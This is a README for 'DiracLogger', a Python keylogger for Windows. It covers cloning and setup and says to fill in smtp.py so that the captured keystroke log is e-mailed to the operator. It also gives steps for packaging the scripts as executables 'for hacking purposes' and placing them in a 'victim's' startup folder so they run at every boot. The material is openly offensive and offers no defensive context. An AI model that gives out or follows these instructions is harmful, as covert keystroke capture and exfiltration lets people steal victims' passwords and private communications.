# DiracLogger
Simple Windows keylogger in Python 3

# Installation
Make sure to have Git installed:
  git clone https://github.com/DiracSpace/DiracLogger.git

Make sure to have Python 3 installed:
  Windows: https://www.python.org/ftp/python/3.7.4/python-3.7.4-amd64.exe
  Linux: sudo apt-get install python3.

If errors, make sure you have the libraries needed for usage. Read the script for used libraries if the terminal doesn't give you the information needed.

Reminder: Make sure to change variable values in smtp.py, otherwise the log.txt will not send to your e-mail.

# Usage
Go to directory of cloning. Type python3 diraclogger.py for test execution.

# Notes
For hacking purposes, I recommend using executable files on Windows. This script doesn't support hacking for Linux. 
Use py2exe library for conversion: https://pypi.org/project/py2exe/

This will create two executables, one for logger and another for smtp. Make sure to add them to victim's computer startup folder by following these steps:
  windows key + 'R'
  shell:startup
  Add python executables to the folder
  restart computer

# Having trouble?
If your having trouble in using py2exe, use pyinstaller: http://www.pyinstaller.org/
